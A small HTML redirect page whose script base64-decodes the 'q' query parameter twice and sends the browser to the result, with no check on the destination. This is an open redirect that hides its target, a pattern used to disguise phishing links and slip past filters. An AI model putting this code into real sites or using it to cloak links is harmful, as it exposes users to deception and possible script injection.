<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />
    <title>Redirecting...</title>
    <script>
      (function () {
        const q = new URLSearchParams(window.location.search).get("q");
        if (!q) {
          document.body.innerText = "⚠️ Missing 'q' parameter";
          return;
        }
        try {
          const level1 = atob(q);
          const level2 = atob(level1);
          location.replace(level2);
        } catch (e) {
          document.body.innerText = "🚫 Invalid base64 or redirect failed.";
        }
      })();
    </script>
  </head>
  <body>
    <p>🔄 Redirecting...</p>
  </body>
</html>
